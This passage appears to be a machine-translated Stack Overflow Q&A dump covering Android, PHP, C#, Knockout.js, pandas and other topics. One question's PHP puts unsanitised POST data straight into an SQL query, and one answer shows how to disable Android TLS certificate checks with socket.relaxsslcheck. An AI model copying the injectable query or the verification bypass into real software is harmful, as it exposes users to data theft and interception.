  arrow_points[0][2] = Point( 40*mp, 60*mp );
  arrow_points[0][3] = Point( 30*mp, 60*mp );
  arrow_points[0][4] = Point( 50*mp, 100*mp );
  arrow_points[0][5] = Point( 70*mp, 60*mp );
  arrow_points[0][6] = Point( 60*mp, 60*mp );
};
  const Point* ppt[1] = { arrow_points[0] };
  int npt[] = { 7 };
  fillPoly( img,
        ppt,
        npt,
           1,
      Scalar( 250, 0, 0 ),
    lineType );
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:14:34.213

旋转是一种仿射变换。查看仿射变换的文档：

[http://docs.opencv.org/doc/tutorials/imgproc/imgtrans/warp_affine/warp_affine.html](http://docs.opencv.org/doc/tutorials/imgproc/imgtrans/warp_affine/warp_affine.html)

# android - Android ListView 异步

> ID：13221171
> 
> 赞同：-2
> 
> 时间：2012-11-04T17:46:31.830
> 
> 标签：android, listview, android-asynctask

我有一个列表，当我单击一个项目时，应该会出现另一个屏幕。我之前已经成功地做到了这一点，但我已经将我的列表移到了 Async - 所以这个类扩展了 AsyncTask 而不是 ListView。我假设这就是为什么我在以下方法上遇到错误的原因：

```
getListView();
getApplicationContext();
startActivity(in); 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:52:07.523

您将需要 a`List`和 a `AsyncTask`。使用`onProgressUpdate`或`onPostExecute`从您的`AsyncTask`.

# asp.net - Internet Explorer 启动 silverlight 应用程序时无法显示网页

> ID：13221177
> 
> 赞同：0
> 
> 时间：2012-11-04T17:47:25.320
> 
> 标签：asp.net, silverlight, iis-7.5, database-connection

我在设置我的网络应用程序时遇到了一个奇怪的问题。我有一台干净的网络服务器机器，其中有两个 Web 应用程序。一个是asp.net 应用程序，而另一个是silverlight 应用程序。两者都应该使用托管在外部数据库服务器上的相同数据库。

我的问题是，当我的 asp.net 应用程序正常工作时，我的 silerlight 应用程序甚至没有加载。在我得到 Internet Explorer 之前加载大约一分钟（没有 silverlight 加载指示器）无法显示包含以下信息的网页：

• Internet 连接已丢失。•该网站暂时不可用。• 无法访问域名服务器 (DNS)。•域名服务器(DNS) 没有网站域的列表。•地址可能有输入错误。•如果这是一个HTTPS（安全）地址，单击工具，单击Internet 选项，单击高级，然后检查以确保在安全部分下启用了SSL 和TLS 协议。

如果我在 web.config 中更改我的连接字符串以使 silverlight 应用程序连接到测试数据库服务器（也是外部的），它工作正常。

这告诉我应该正确配置应用程序？

连接字符串：`<add name="myConn" connectionString="Data Source=prod_server;Initial Catalog=mydb;Persist Security Info=True;User ID=myusername;Password=mysecretpassword" providerName="System.Data.SqlClient"/>`

它们在同一个应用程序池中运行。我还尝试将它们设置在单独的应用程序池中，但没有成功。

Fiddler 报告 504 错误，但为什么我的 Web 应用程序可以工作？这个 IIS 7.5

希望有人可以帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:55:52.820

解决了。数据库更新是否超时。一些开发人员应该学习使用日志记录！

# android - PagerAdapter doesn't have the getPageWidth() method, as documented

> ID：13221182
> 
> 赞同：1
> 
> 时间：2012-11-04T17:48:19.500
> 
> 标签：android, android-viewpager

Using sdk version 8, with android-support-v4, I am trying to make implement a PagerAdapter that shows multiple pages at once.

Found some good advice online, that indicated the best way to achieve this is to override the getPageWidth(int) method on PagerAdapter.

[http://commonsware.com/blog/2012/08/20/multiple-view-viewpager-options.html](http://commonsware.com/blog/2012/08/20/multiple-view-viewpager-options.html)

However, PagerAdapter does not have that method in the android-support-v4.jar. I can't figure out why, since androids own documentation does confirm the existence of that method.

[http://developer.android.com/reference/android/support/v4/view/PagerAdapter.html#getPageWidth(int)](http://developer.android.com/reference/android/support/v4/view/PagerAdapter.html#getPageWidth%28int%29)

The problem of course if that if the method doesn't exist, it makes no sense to override it as it would never be called.

Any ideas?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T17:52:32.583

Your JAR is out of date, presumably. Make sure that you are on the latest Android Support package. Or, grab the JAR from [the sample project that I linked to in the blog post](https://github.com/commonsguy/cw-omnibus/tree/master/ViewPager/MultiView1).

# c# - 聊天的持久数据

> ID：13221184
> 
> 赞同：0
> 
> 时间：2012-11-04T17:48:31.970
> 
> 标签：c#, asp.net, session, session-variables

我正在编写一个聊天。基本上，我有一个窗口 ( `TextBox`)，我想在其中显示当前正在对话中的所有用户，但我不想使用数据库。

所以，我需要将我的活跃用户表保存在某个地方，这些东西在刷新时不会被删除。

我看着塞申斯。但是，它们过期了，我无法将我的活跃用户数组保留在那里。我还查看了应用程序对象，看来这可以解决我的困境。然而：

说我打电话

```
String[] users = new users String[1000];  
Application['users'] = users; 
```

在我的`Page_Load()`方法中，确保我可以将新用户存储到该表中，但是每个页面加载都会覆盖该表，并且我将始终只显示一个用户，但我想按照这些方法实现一些东西`isset()`可以解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T17:58:06.520

> 所以我需要将我的活跃用户表保存在某个地方，在刷新时不会被删除。

数据库就是解决方案。

它`Application[]`实际上是一个静态变量，因此在池回收时将其删除，并且如果您有多个池，那么您将拥有多个公共应用程序变量。

阅读应用程序状态：[在 ASP.NET 中使用静态变量而不是应用程序状态](https://stackoverflow.com/questions/10960695/using-static-variables-instead-of-application-state-in-asp-net/10964038#10964038)

使用 asp.net 聊天查看其他一些示例：

[http://www.codeproject.com/Articles/33817/Build-a-Web-based-Chat-using-ASP-NET-Ajax](http://www.codeproject.com/Articles/33817/Build-a-Web-based-Chat-using-ASP-NET-Ajax)

# ruby - 如何使用来自 github 存储库的新 afm 构建 pdfkit

> ID：13221185
> 
> 赞同：3
> 
> 时间：2012-11-04T17:48:31.163
> 
> 标签：ruby, github, compilation, coffeescript, pdfkit

pdfkit-www 是一个很棒的库。它使您可以直接从浏览器输出 pdf。

要查看演示：[http ://ef4.github.com/pdfkit-www/demo.html](http://ef4.github.com/pdfkit-www/demo.html)

从演示中，我获取了 pdfkit.min.js 文件；而且效果很好。字体除外；唯一的嵌入字体是 Arial，尚不支持从目录嵌入字体。如果你想要更多的字体，你必须构建 pdfkit.min.js 并在目录中添加你想要使用的字体度量；如此处所述：[https ://github.com/ef4/pdfkit-www#building](https://github.com/ef4/pdfkit-www#building)

关键是我不知道如何做到这一点。这是由红宝石和咖啡脚本驱动的。但在这里，我感觉自己就像是面对一个大方程式的一只小猴子。

我在哪里输入东西？（我在 Windows 7 上）我尝试在基本的 Windows 命令行、ruby.exe 命令行以及在克隆存储库时单击“在此处打开 shell”时打开的命令行中键入这些内容在 github 客户端上。

/* - - - 编辑 - - - */

好的，看起来我应该用“Git Shell”来做（没有先在我的桌面上看到图标）。前两行似乎有效，但“捆绑安装”会引发错误。（不承认）。

并且“rake”行中止，因为它“无法加载此类文件 - 捆绑器”。

/* ----- 在 Duck Boyle 回答后编辑 2 ----- */ （好的，编辑会更好）

好的，非常感谢，这解决了第一个问题。

现在“捆绑安装”命令抛出：

```
Your Gemfile has no remote source. If you need gems that are not already on your machine, add a line like this to your Gemfile : source 'https://rubygems.org'
Could not find rake-0.9.2 in any of the sources 
```

“rake”命令抛出：

```
cannot load such file -- uglifier 
```

所以我尝试了“gem install uglifier”，它似乎通过安装 uglifier 来解决“rake”命令的错误；然后我根据错误告诉我做什么，为不同版本的 json 和 execjs 和其他东西安装了几个 gem；直到“捆绑安装”命令抛出：

```
Using lib..
...
Your bundle is complete ! 
```

哟呵！

但现在，“rake”命令抛出：

```
rake aborted!
Type Error : This objet cannot manage this property or method 
```

我确实使用 --trace 运行了命令；但我完全不知道我必须在这里观看什么：

![在此处输入图像描述](../Images/50ccfc7d511473ec7f11ba761ae7aa8a.png)

/* ----- 编辑 3 ----- */

是的，我确实将源“ [https://rubygems.org](https://rubygems.org) ”放在了我的 gem 文件中，这给了我安装所有我应该安装的 gem 的线索。

（请不要太嘲笑我，我只是一个设计师，当涉及的问题不仅仅是基本的html / css东西时，我什么都不懂）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T20:36:03.987

您应该安装 bundler，用于许多 Ruby 项目中的依赖管理。尝试这个：

```
gem install bundler 
```

如果您在那之后遇到更多问题，我不会感到惊讶，请告诉我。

# intellij-idea - 使用 IntelliJ + Spring Data + AspectJ

> ID：13221187
> 
> 赞同：2
> 
> 时间：2012-11-04T17:48:34.747
> 
> 标签：intellij-idea, aspectj, spring-data-neo4j, spring-data-graph

我正在尝试使用 IntelliJ 11.1.4 Ultimate 版中的 Spring Data Graph 项目。该项目构建良好，但编辑器说找不到`persist()`我的类上注释的方法。`@NodeEntity`此外，如果方面增强的方法（如持久化）不会显示自动完成建议。

我正在使用 AspectJ Support 插件，并且我将编译器设置为 AJC。IntelliJ 和 Maven 都可以构建和运行项目，看来编辑器是唯一有问题的部分。

我错过了一些明显的东西吗？这是 IntelliJ 的限制吗？我以为 11.1.4 解决了这个问题，但我可能弄错了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T10:36:01.977

不幸的是，AspectJ 支持还没有完全实现——尽管解析和完成应该可以工作。您能否在[跟踪器](http://youtrack.jetbrains.com/dashboard#newissue=yes)中提交一张附有小型演示项目的票？

# java - 将方法放入 TreeMap 的实现中

> ID：13221192
> 
> 赞同：2
> 
> 时间：2012-11-04T17:48:46.783
> 
> 标签：java, junit, treemap

我正在实现一个名为 MyTreeMap 的 TreeMap 类，而 put 方法给我带来了一些麻烦。在测试期间，它并没有更新已经存在的键的值，而是似乎完全清除了节点。这是代码：

```
public class MyTreeMap<K extends Comparable<? super K>,V> extends AbstractMap<K,V>  {

K key;
V value;
int height;
MyTreeMap<K,V> left,right;
int size;

public V put(K key, V value) {

    if(this.isEmpty()) {
        this.key = key;
        this.value = value;

        this.size++;
        setHeight();

        return null;
    }

    else if(this.key.compareTo(key) == 0) {
        V temp = this.value;
        this.value = value;
        return temp;
    }

    else if(this.key.compareTo(key) > 0) {
        if(this.left == null) {
            this.left = new MyTreeMap<K,V>(key,value,null,null);
            this.size++;
            if(left.height > right.height + 1 || right.height > left.height + 1)
                restructure(this);
            setHeight();
            return null;
        }
        else
            return this.left.put(key, value);
    }
    else {
        if(this.right == null) {
        this.right = new MyTreeMap<K,V>(key,value,null,null);
        this.size++;
        if(left.height > right.height + 1 || right.height > left.height + 1)
            restructure(this);
        setHeight();    
        return null;
        }
        else
            return this.right.put(key, value);
    }
} 
```

这是测试，第一个 assertEquals 通过，第二个没有，失败跟踪显示在该行的注释中

```
@Test
public void putTest2() {
    TreeMap<String,LinkedList<Integer>> actual = new TreeMap<String,LinkedList<Integer>>();
    MyTreeMap<String,LinkedList<Integer>> test = new MyTreeMap<String,LinkedList<Integer>>();

    LinkedList<Integer> actualList = new LinkedList<Integer>();
    actualList.add(0);
    actualList.add(4);

    LinkedList<Integer> testList = new LinkedList<Integer>();
    testList.add(0);
    testList.add(4);

    actual.put("hello", actualList);
    test.put("hello", actualList);

    assertEquals(actual, test); //this part passes, indicating that it adds new keys correctly

    LinkedList<Integer> tempList;

    tempList = actual.get("hello");

    tempList.add(6);

    actual.put("hello", tempList);
    test.put("hello", tempList);

    assertEquals(actual, test); //this part fails, fail trace: expected:<{hello=[0,4,6,6]}> but was <[]>
} 
```

}

如果您可以帮助我解决此错误，那将很有帮助。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T17:53:30.627

在这种情况下，`assertEquals(a, b)`测试两个`Map`参数是否*是同一个对象*，而不是它们*包含相同的值*。

您的类和`TreeMap`实现都没有`equals()`，因此使用该类的默认实现`Object`，它只是返回`a == b`.

查看[Hamcrest 库](http://code.google.com/p/hamcrest/)，以有意义地比较集合的价值。

# php - AJAX 发布到数据库

> ID：13221200
> 
> 赞同：0
> 
> 时间：2012-11-04T17:49:12.257
> 
> 标签：php, jquery, ajax, post

我查看了其他问题，但找不到为什么这不起作用的答案。我正在网上学习教程。这是我的代码：

HTML 文件：

```
<!DOCTYPE HTML>
<html>
<head>
<title>AJAX Test</title>
</head>
<body>
<h4>Enter an Item</h4>
<input type="text" id="item" /><br />
<input type="button" id="button" value="Submit" /><br />
<div id="content"></div>
<script type="text/javascript" scr="ajax.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript"></script>
</body>
</html> 
```

JS文件：

```
$('#button').click(function() {
var item = $('#item').val();

$('#content').text('Loading...');

$.post('ajax.php', { item: item }, function(data) {
    $('#content').text(data);
    });
}); 
```

PHP 文件：

```
<?php
include 'db.php';

if (isset($_POST['item'])) {
    $item = $_POST['item'];
    $sql = mysql_query("INSERT INTO items(item)VALUES('$item')");
    if ($sql === true) {
        echo "Inserted into database";
    } elseif ($sql ==== false) {
        echo "Error inserting into database";
    }
 }
 ?> 
```

我看不出我做错了什么。本教程具有相同的代码。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:02:17.553

好吧，我不知道我是否可以帮助您：

你的代码有一些错误

1.  elseif 条件不是 ====(4) 只是 ===(3)

2.  ajax.js 文件应该在 jquery 库之后

3.  src 属性不是 scr。

4.  当然，jquery 库的 URL 应该以 http:// 开头，因为它是外部资源。

5.  mysql_query() 函数应该有连接变量，例如：
    mysql_query("[query here]", $connect);

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:16:32.667

moonwave99 是正确的（我不知道为什么不赞成投票）.. 而且 scr="ajax" 应该是 src="ajax" 在你的 html 中，应该放在 head 甚至之前。其他原因可能是 ajax.php 在站点中的位置，也许声明整个 URL 会有所帮助：

```
$.post('http://wholeurl/ajax.php', { 
      item: item 
   }, function(data) {
      $('#content').text(data);
   }); 
```

希望这会有所帮助，如果没有，请指定错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T17:53:31.093

除了您可能遇到的任何其他错误之外，您应该在脚本**之前导入 jQuery：**

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript"></script>    
<script type="text/javascript" src="ajax.js"></script> 
```

# php - 将实际字符串“%0”与正则表达式匹配

> ID：13221202
> 
> 赞同：-3
> 
> 时间：2012-11-04T17:49:17.540
> 
> 标签：php, regex

`CONTENT=%0`我正在尝试使用正则表达式匹配子字符串。我已经尝试了很长一段时间，但似乎没有任何效果！有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:04:23.447

对于这种简单的任务，您不需要使用正则表达式，但是......如果你想......你可以......使用正则表达式模式

```
CONTENT=%0 
```

* * *

### PHP代码：

```
$pattern = '/CONTENT=%0/';
$s = preg_replace($pattern, $replacement, $s); 
```

请参阅**[此演示](http://ideone.com/ZQ3GjP)**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:54:13.087

这个对我有用：`/CONTENT=%0/`

# c# - 如何根据方法返回启用/禁用 WPF 按钮

> ID：13221204
> 
> 赞同：2
> 
> 时间：2012-11-04T17:49:20.103
> 
> 标签：c#, wpf, .net-4.0

我需要根据方法的返回启用/禁用 WPF 按钮。
我有一种`HasPermission`方法可以告诉我用户是否可以单击该按钮。

我已经看到我可以`Command => CanExecute`用来避免执行该操作。在这里看到：

[如何启用/禁用 WPF 中的按钮？](https://stackoverflow.com/questions/7921280/how-to-enable-disable-a-button-in-wpf)

我的问题是，我有很多 Windows 来检查权限，这是最好的方法吗？我真的需要为我拥有的每个窗口写 from `2`to命令吗？`N`

有什么办法可以做到这一点`global`？
例如，我可以创建通用命令（搜索/创建/...），然后只获取调用它的窗口并将其传递给我的`HasPermission`方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T17:59:56.753

您绝对可以创建一个包含静态命令的静态类，并从 XAML 中的任何位置引用这些命令。

它是这样的：

```
public static class GlobalCommands
{
   //ICommand can be DelegateCommand, RelayCommand... whatever floats your boat.
   public static ICommand SearchCommand { get; set; }

   //Implementation, and more static commands...
} 
```

然后在某些方面：

```
<UserControl ...>
   ...
   <Button Content="Search" Command="{x:Static infra:GlobalCommands.SearchCommand}" />
   ...
</UserControl> 
```

当然`infra:`是一个xmlns命名空间映射到`GlobalCommands`'命名空间。

# javascript - 当第二次点击按钮做某事

> ID：13221207
> 
> 赞同：2
> 
> 时间：2012-11-04T17:49:35.887
> 
> 标签：javascript, events, button, click, dom-events

我需要当一个按钮被点击一次它会显示消息“不显示”。当点击两次返回原始消息“显示”。我已经做了第一件事，我只需要第二件事的帮助，那就是第二次点击。

**JavaScript：**

```
function show()
{
    document.myform.button.value ="Dont show";//Changes message on button when clicked.
    document.myform.button.innerHTML= "Dont show";
} 
```

**HTML：**

```
<form>
<input type=button value= "Show" name="button" id= "idButton"
onClick="show()">
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:00:25.800

我建议：

```
function toggle(el, message1, message2) {
    if (!el || !message1 || !message2) {
        return false;
    }
    var text = el.tagName.toLowerCase() == 'input' ? el.value : (el.textContent || el.innerText),
        newText = text == message1 ? message2 : message1;

    if (el.tagName.toLowerCase() == 'input') {
        el.value = newText;
    }
    else {
        el.firstChild.nodeValue = newText;
    }
}

document.getElementById('idButton').onclick = function(){
    toggle(this, 'Show', "Don't show");
}; 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/MYwNh/)。

以上内容稍作修改：

```
function isTag(el, tagname) {
    if (!el || !tagname) {
        return false;
    }
    else {
        return el.tagName.toLowerCase() == tagname.toLowerCase() ? true : false;
    }
}

function toggle(el, message1, message2) {
    if (!el || !message1 || !message2) {
        return false;
    }
    else {
        var isInput = isTag(el, 'input'),
            text = isInput ? el.value : el.textContent || el.innerText,
            newText = text == message1 ? message2 : message1;
        if (isInput) {
            el.value = newText;
        }
        else if (el.textContent) {
            el.textContent = newText;
        }
        else {
            el.innerText = newText;
        }
    }
}

document.getElementById('idButton').onclick = function(){
    toggle(this, 'Show', "Don't show");
}; 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/MYwNh/1/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:53:47.397

您的函数 show 需要检查当前按钮值并将其设置为适当的新值。

我认为 show 函数主体周围缺少的大括号是一个错字。

# knockout.js - Knockout.js 点击绑定参数

> ID：13221211
> 
> 赞同：10
> 
> 时间：2012-11-04T17:50:01.597
> 
> 标签：knockout.js

我有这个小 ViewModel：

```
function BooksViewModel() {
    var self = this;
    self.books = ko.observableArray(library);

    self.findByLanguage = function(lang) {
        self.books = ko.computed(function() {
            return ko.utils.arrayFilter(library, function(book) { 
                return book.language() === lang; 
            });
        });
    };
} 
```

findByLanguage 方法按语言过滤数组。在视图中，我尝试像这样实现：

```
<ul class="dropdown-menu">
    <li><a tabindex="-1" href="#" data-bind="click: findByLanguage('C')">C</a></li>
    <li><a tabindex="-1" href="#" data-bind="click: findByLanguage('Cpp')">C++</a></li>
</ul> 
```

我试图通过从那里调用语言参数来重用该函数。但是，如果我在 data-bind 上传递一个带括号的函数，它会自动被调用。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-11-04T18:00:20.907

完成此操作的最简单方法是将其包装在仅在单击时执行的函数中，例如：

```
<li><a tabindex="-1" href="#" data-bind="click: function () {findByLanguage('C')}"> 
```

或者，您可以使用绑定上下文来解决问题。

```
<li><a tabindex="-1" href="#" data-bind="click: findByLanguage.bind('C')"> 
```

[这是使用 JS Fiddle (http://jsfiddle.net/uFyaP/1/) 的点击绑定示例](http://jsfiddle.net/uFyaP/1/)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-04T18:29:56.120

您可能对在视图模型中添加额外字段的稍微不同的方法感兴趣。

[http://jsfiddle.net/jearles/RN9Dw/](http://jsfiddle.net/jearles/RN9Dw/)

通过添加`languages`到视图模型中，您可以使用 Knockout 来呈现菜单，并且`click`绑定将自动将单击的语言传递给处理函数。此外，添加`selectedLanguage`为 observable 允许`books`在您选择或清除语言时更改计算值。

## HTML

```
<ul class="dropdown-menu" data-bind="foreach: languages">
    <li><a tabindex="-1" href="#" data-bind="text: $data, click: $root.filterByLanguage"></a></li>
</ul>
<button data-bind="click: showAll">Show All</button>

<div data-bind="foreach: books">
    <p><span data-bind="text: name"></span>, <span data-bind="text: language"></span></p>
</div>​ 
```

## JS

```
function BooksViewModel() {
    var self = this;

    self.languages = ko.observableArray(['C', 'C++']);
    self.selectedLanguage = ko.observable();
    self.library = [{name: 'Book A', language: 'C'}, {name: 'Book B', language: 'C++'}]; 
    self.books = ko.computed(function() {
        return ko.utils.arrayFilter(self.library, function(book) { 
          return self.selectedLanguage() == null ||
              book.language === self.selectedLanguage(); 
          })
    });

    self.showAll = function() {
        self.selectedLanguage(null);
    }
    self.filterByLanguage = function(lang) {
        self.selectedLanguage(lang);
    };
}

ko.applyBindings(new BooksViewModel()); 
```

​</p>

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-07-24T08:58:31.363

我知道这个问题很老，但如果有人感兴趣，根据[文档](http://knockoutjs.com/documentation/click-binding.html)，第一个参数应该是 viewModel，然后它按预期工作。

```
<ul class="dropdown-menu">
    <li><a tabindex="-1" href="#" data-bind="click: findByLanguage.bind($data, 'C')">C</a></li>
    <li><a tabindex="-1" href="#" data-bind="click: findByLanguage.bind($data, 'Cpp')">C++</a></li>
</ul> 
```

# dataframe - 仅当索引为日期和时间时，如何根据时间选择熊猫数据框中的行

> ID：13221218
> 
> 赞同：1
> 
> 时间：2012-11-04T17:50:34.720
> 
> 标签：dataframe, pandas

我有一个看起来像这样的数据框：

```
<class 'pandas.core.frame.DataFrame'>
DatetimeIndex: 2016910 entries, 2009-01-02 04:51:00 to 2012-11-02 20:00:00
Freq: T
Data columns:
X1    2016910  non-null values
X2    2016910  non-null values
X3    2016910  non-null values
X4    2016910  non-null values
X5    2016910  non-null values
dtypes: float64(5) 
```

我想通过仅访问整个日期范围内的特定时间来“过滤”它。例如，我想返回一个数据框，其中包含时间在 13:00:00 到 14:00:00 之间的所有行，但包含所有日期。我正在从 CSV 文件中读取数据，并且日期时间是一列，但我可以轻松地使输入 CSV 文件包含单独的日期和时间。我尝试了单独的日期和时间路线，并创建了一个多索引，但是当我这样做时，我最终得到了两个索引列——其中一个包含正确的日期和不正确的时间，而不仅仅是一个日期，第二个包含一个不正确的日期，然后是一个正确的时间，而不仅仅是一个时间。我的多索引尝试的输入数据如下所示：

```
 20090102,04:51:00,89.9900,89.9900,89.9900,89.9900,100
 20090102,05:36:00,90.0100,90.0100,90.0100,90.0100,200
 20090102,05:44:00,90.1400,90.1400,90.1400,90.1400,100
 20090102,05:50:00,90.0500,90.0500,90.0500,90.0500,500
 20090102,05:56:00,90.1000,90.1000,90.1000,90.1000,300
 20090102,05:57:00,90.1000,90.1000,90.1000,90.1000,200 
```

我尝试使用以下代码阅读：

```
 singledf = pd.DataFrame.from_csv("inputfile",header=None,index_col=[0,1],parse_dates=True) 
```

这导致了一个看起来像这样的数据框：

```
singledf.sort()
singledf

<class 'pandas.core.frame.DataFrame'>
MultiIndex: 716244 entries, (<Timestamp: 2009-01-02 00:00:00>, <Timestamp: 2012-11-04      04:51:00>) to (<Timestamp: 2012-11-02 00:00:00>, <Timestamp: 2012-11-04 20:00:00>)
Data columns:
X2    716244  non-null values
X3    716244  non-null values
X4    716244  non-null values
X5    716244  non-null values
X6    716244  non-null values
dtypes: float64(4), int64(1) 
```

也许多索引方法是完全错误的，但这是我尝试过的一件事。似乎它坚持使用日期时间对象，并希望强制索引列具有日期时间，而不仅仅是日期或时间。我的非多索引尝试的源 CSV 文件如下所示：

```
20090102 04:51:00,89.9900,89.9900,89.9900,89.9900,100
20090102 05:36:00,90.0100,90.0100,90.0100,90.0100,200
20090102 05:44:00,90.1400,90.1400,90.1400,90.1400,100
20090102 05:50:00,90.0500,90.0500,90.0500,90.0500,500
20090102 05:56:00,90.1000,90.1000,90.1000,90.1000,300 
```

我正在使用熊猫 .9。任何建议表示赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:35:32.323

常规 DatetimeIndex 允许使用 between_time 方法。

```
In [12]: data = """\
 20090102,04:51:00,89.9900,89.9900,89.9900,89.9900,100
 20090102,05:36:00,90.0100,90.0100,90.0100,90.0100,200
 20090102,05:44:00,90.1400,90.1400,90.1400,90.1400,100
 20090102,05:50:00,90.0500,90.0500,90.0500,90.0500,500
 20090102,05:56:00,90.1000,90.1000,90.1000,90.1000,300
 20090102,05:57:00,90.1000,90.1000,90.1000,90.1000,200
"""

In [13]: singledf = pd.DataFrame.from_csv(StringIO(data), header=None, parse_dates=[[0,1]])

In [14]: singledf
Out[14]:
                        X2     X3     X4     X5   X6
X0_X1
2009-01-02 04:51:00  89.99  89.99  89.99  89.99  100
2009-01-02 05:36:00  90.01  90.01  90.01  90.01  200
2009-01-02 05:44:00  90.14  90.14  90.14  90.14  100
2009-01-02 05:50:00  90.05  90.05  90.05  90.05  500
2009-01-02 05:56:00  90.10  90.10  90.10  90.10  300
2009-01-02 05:57:00  90.10  90.10  90.10  90.10  200

In [15]: singledf.between_time('5:30:00', '5:45:00')
Out[15]:
                        X2     X3     X4     X5   X6
X0_X1
2009-01-02 05:36:00  90.01  90.01  90.01  90.01  200
2009-01-02 05:44:00  90.14  90.14  90.14  90.14  100 
```

# android-emulator - 努力让 SSLCertificateSocketFactory 在 android 模拟器上强制执行“socket.relaxsslcheck yes”

> ID：13221219
> 
> 赞同：1
> 
> 时间：2012-11-04T17:50:48.587
> 
> 标签：android-emulator

我将自签名证书用于开发和测试目的。我研究了各种方法让 android 模拟器接受自签名证书。到目前为止，我发现了以下方法的变体：

1.  提供您自己的将接受任何证书的安全类。
2.  为您的应用创建一个包含自签名公钥的密钥库。
3.  将属性 socket.relaxsslcheck 设置为 yes。

前两个选项非常复杂，并在您的代码中引入了对您的环境的依赖，例如开发、测试或生产。

选项 3 我喜欢，因为环境配置驱动行为，与将配置的数据源提供给在容器中运行的应用程序的 Web 容器不同。开发环境将指向开发数据源等。不幸的是，我正在努力让它工作。我尝试了以下方法：

*   使用 adb 设置属性

    `adb shell setprop socket.relaxsslcheck yes`

*   使用 System.setProperty

    `System.setProperty("socket.relaxsslcheck","yes")`

*   试图改变 /system/build.prop 和 default.prop

第一个选项会被忽略。根据我的阅读，似乎设置该属性将在重新启动后生效。但是该属性似乎是不稳定的，它无法在模拟器重新启动后继续存在。

`System.setProperty(...)`由于工厂已经创建，这种方法似乎为时已晚。由于上述问题（代码中的开发环境特定代码），除非别无选择，否则我宁愿不走这条路。

最后一个选项应该在模拟器重启后仍然存在，但即使在运行`adb root`.

我是 Android 开发新手，希望能提供一些关于最佳方法以及如何使其发挥作用的指导。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T18:34:41.007

好吧，您必须使用该选项准确指定“是”，即：

```
-prop socket.relaxsslcheck=yes 
```

源代码只是将属性值与'yes'进行比较（并且不费心也测试与'true'或'1'等等效值......）

使用 ADT 捆绑包，我通过以下方式设置该选项

```
Run -> Debug Configurations... -> Android Application -> ProjectName -> Target
  -> Additional Emulator Command Line Options 
```

仿真器重新启动后，`SSLSocketCertificateFactory`在广告中工作，即它接受所有证书。可以通过查看日志来验证：

```
12-08 18:10:52.382: W/SSLCertificateSocketFactory(763): 
  *** BYPASSING SSL SECURITY CHECKS (socket.relaxsslcheck=yes) *** 
```

我使用自行创建的证书对其进行了测试 - 没有该属性集连接失败并出现证书验证错误，使用该属性集（或使用`SSLCertificateSocketFactory.getInsecure()`）TLS 套接字连接得很好。

顺便说一句，`SSLSocketCertificateFactory`有时使用起来似乎很棘手——例如，[我正在努力从那个工厂获取一个实际实例](https://stackoverflow.com/questions/13779404/how-to-get-an-sslcertificatesocketfactory-instance)——人们发布的解决方法基本上是说：忽略那个工厂。谷歌搜索一些人甚至建议完全[不要](https://groups.google.com/d/msg/android-security-discuss/QXJMhV0b5Hw/1J6wUDXi0U0J)使用该工厂 - 但没有给出太多理由。

# c# - 如何在继续程序之前等待线程结束

> ID：13221226
> 
> 赞同：0
> 
> 时间：2012-11-04T17:51:20.253
> 
> 标签：c#, multithreading

我有这个在 C# 中使用线程的简单程序。`Console.ReadKey();`在我执行终止程序之前，如何确保所有线程都已完成执行（否则它会直接进入`ReadKey`，我必须按下它才能让线程继续执行）

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

namespace Partie_3
{
    class Program
    {
        static int _intToManipulate;
        static object _lock;
        static Thread thread1;
        static Thread thread2;

        static void Main(string[] args)
        {
            _intToManipulate = 0;

            _lock = new object();

            thread1 = new Thread(increment);
            thread2 = new Thread(decrement);

            thread1.Start();
            thread2.Start();

            Console.WriteLine("Done");
            Console.ReadKey(true);
        }

        static void increment()
        {
            lock (_lock)
            {
                _intToManipulate++;
                Console.WriteLine("increment : " + _intToManipulate);
            }
        }
        static void decrement()
        {
            lock (_lock)
            {
                _intToManipulate--;
                Console.WriteLine("decrement : " + _intToManipulate);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T17:59:36.637

您正在寻找[Thread.Join()](http://msdn.microsoft.com/en-us/library/95hbf2ta.aspx)：

```
thread1.Start();
thread2.Start();

thread1.Join();
thread2.Join();

Console.WriteLine("Done");
Console.ReadKey(true); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T18:03:12.293

可以在此处找到类似的问题：[C#: Waiting for all threads to complete](https://stackoverflow.com/questions/263116/c-waiting-for-all-threads-to-complete)

对于 C# 4.0+，我个人更喜欢使用任务而不是线程并等待它们完成，如投票第二高的答案中所述：

```
for (int i = 0; i < N; i++)
{
     tasks[i] = Task.Factory.StartNew(() =>
     {               
